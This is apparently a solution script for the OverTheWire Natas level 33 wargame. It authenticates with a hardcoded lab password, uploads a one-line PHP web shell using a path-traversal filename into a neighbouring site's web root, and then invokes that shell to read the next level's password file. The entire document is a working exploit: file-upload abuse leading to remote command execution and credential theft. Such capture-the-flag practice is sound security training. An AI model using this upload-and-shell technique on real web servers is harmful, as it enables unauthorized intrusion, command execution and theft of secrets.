import requests

URL = 'http://natas33.natas.labs.overthewire.org'
URL2 = 'http://natas33-new.natas.labs.overthewire.org'
USERNAME = 'natas33'
PASSWORD = 'shoogeiGa2yee3de6Aex8uaXeech5eey'

s = requests.Session()
s.auth = (USERNAME, PASSWORD)

files = [('uploadedfile', ('<?php system($_GET["cmd"]); ?>'))]
datas = {'filename': "../../var/www/natas/natas33-new/omg.php"}

s.post(URL,
       files=files,
       data=datas,
       #proxies={'http': 'http://127.0.0.1:8080'},
       )

r = s.get(URL2 + '/omg.php?cmd=cat /etc/natas_webpass/natas34')
print(r.text)
